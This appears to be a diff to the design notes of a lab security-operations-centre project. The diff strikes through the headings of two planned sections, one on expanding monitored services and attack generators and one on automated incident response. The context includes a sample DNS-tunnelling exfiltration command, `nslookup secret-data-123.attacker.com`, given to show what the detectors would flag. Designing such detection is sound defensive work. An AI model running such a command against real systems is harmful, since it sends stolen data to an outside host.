@@ -20,7 +20,7 @@ Utilize the existing `StateStore` (which currently tracks failed logins) to trac
 - **`is_new_ip`:** Add a boolean flag (True/False) to the enriched event.
 - *Impact:* Attacks frequently originate from newly spun-up infrastructure. Flagging an IP as "new" provides a powerful behavioral indicator that can be combined with other rules or the ML model to increase the overall anomaly score.
 
-## 2. Expand Monitored Services & Attack Vectors
+## 2. ~~Expand Monitored Services & Attack Vectors~~
 
 To demonstrate the versatility of the SOC (specifically its ability to monitor an entire network, not just web traffic), we can deploy additional vulnerable services to the `monitored_net` and create corresponding attack generators.
 
@@ -41,7 +41,7 @@ To demonstrate the versatility of the SOC (specifically its ability to monitor a
 - **Attack:** **DNS Tunneling / Exfiltration** (encoding stolen data inside DNS queries, e.g., `nslookup secret-data-123.attacker.com`).
 - **SOC Behavior:** Packetbeat parses DNS requests. The Detection Engine will use stateless rules to flag unusually long DNS query strings. The ML model will flag the high `variance_score` (since every query contains unique exfiltrated data).
 
-## 3. Automated Incident Response (IR) Service
+## 3. ~~Automated Incident Response (IR) Service~~
 
 To complete the "Detection -> Response" lifecycle, we can build a dedicated Incident Response microservice. Since containerized environments are isolated, this service will use Docker-native response strategies.
 
